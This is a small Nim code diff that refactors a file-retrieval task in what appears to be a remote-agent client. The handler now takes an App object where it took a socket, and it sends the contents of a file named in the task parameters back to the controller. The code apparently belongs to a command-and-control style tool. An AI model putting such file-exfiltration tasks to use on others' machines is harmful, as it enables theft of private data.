@@ -1,7 +1,7 @@
 import std/[net, base64, json, os]
-import ../client/communication
+import ../client/[communication, types]
 
-proc executeTask*(socket: Socket, taskId: int, params: seq[string]) =
+proc executeTask*(app: App, taskId: int, params: seq[string]) =
   let taskOutput = newTaskOutput(taskId)
 
   try:
@@ -9,4 +9,4 @@ proc executeTask*(socket: Socket, taskId: int, params: seq[string]) =
     taskOutput.addData(DataType.File, splitPath(params[0]).tail, contents)
   except IOError:
     taskOutput.error = getCurrentExceptionMsg()
-  socket.sendOutput(taskOutput)
+  app.sendOutput(taskOutput)
